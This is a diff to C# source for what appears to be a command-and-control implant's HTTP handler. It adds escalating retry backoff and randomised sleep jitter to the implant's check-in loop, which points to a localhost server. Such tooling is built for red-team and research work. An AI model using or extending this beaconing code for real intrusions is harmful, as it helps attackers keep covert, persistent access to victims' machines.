@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Net;
 using System.Threading.Tasks;
 
@@ -12,6 +13,7 @@ namespace Drone.Handlers
 
         private WebClient _client;
         private bool _running;
+        private int _retryNumber;
 
         public override void Init(DroneConfig config, Metadata metadata)
         {
@@ -31,12 +33,40 @@ namespace Drone.Handlers
 
             while (_running)
             {
-                try { await CheckIn(); }
-                catch { /* pokemon */ }
+                try
+                {
+                    await CheckIn();
+                    
+                    _retryNumber = 0;  // if successful, ensure retry number is set to 0
+                }
+                catch
+                {
+                    _retryNumber++;
+                    if (_retryNumber > 10) return;
+
+                    var backoffTime = _backoff[_retryNumber];
+                    await Task.Delay(backoffTime * 1000);
+                    
+                    continue;
+                }
 
                 var interval = Config.GetConfig<int>("SleepInterval");
-                await Task.Delay(interval * 1000);
+                var jitter = Config.GetConfig<int>("SleepJitter");
+                var sleep = CalculateSleepTime(interval, jitter);
+
+                await Task.Delay(sleep * 1000);
             }
+        }
+
+        private int CalculateSleepTime(int interval, int jitter)
+        {
+            var diff = (int)Math.Round((double)interval / 100 * jitter);
+
+            var min = interval - diff;
+            var max = interval + diff;
+
+            var rand = new Random();
+            return rand.Next(min, max);
         }
 
         private async Task CheckIn()
@@ -74,6 +104,20 @@ namespace Drone.Handlers
         {
             _running = false;
         }
+
+        private readonly Dictionary<int, int> _backoff = new()
+        {
+            { 1, 2 },      // 2 seconds
+            { 2, 30 },     // 30 seconds
+            { 3, 60 },     // 1 minute
+            { 4, 300 },    // 5 minutes
+            { 5, 600 },    // 10 minutes
+            { 6, 900 },    // 15 minutes
+            { 7, 1800 },   // 30 minutes
+            { 8, 3600 },   // 60 minutes
+            { 9, 43200 },  // 12 hours
+            { 10, 86400 }  // 24 hours
+        };
 
         private static string HttpScheme => "http";
         private static string ConnectAddress => "localhost";
